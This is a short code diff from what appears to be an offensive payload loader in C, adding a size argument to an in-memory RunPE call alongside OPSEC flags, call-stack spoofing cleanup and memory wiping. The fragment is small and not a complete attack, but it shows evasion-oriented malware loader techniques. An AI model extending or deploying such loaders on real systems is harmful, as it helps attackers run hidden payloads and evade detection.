@@ -355,8 +355,8 @@ static void Loader_RunPayload(LOADER_CTX* ctx) {
     } else {
         void (*pPreExec)(void) = (ctx->opsecFlags & OPSEC_FLAG_NO_CALLSTACK)
                                      ? NULL : StackSpoof_Cleanup;
-        DWORD runPeRes = RunPE(ctx->pDecompressedPE, ctx->exportHash, ctx->exportSeed,
-                               ctx->pExportArg, pPreExec);
+        DWORD runPeRes = RunPE(ctx->pDecompressedPE, ctx->origDecompSize, ctx->exportHash,
+                               ctx->exportSeed, ctx->pExportArg, pPreExec);
 
         custom_memset(ctx->pDecompressedPE, 0, ctx->origDecompSize);
         ctx->pVirtualFree(ctx->pDecompressedPE, 0, MEM_RELEASE);
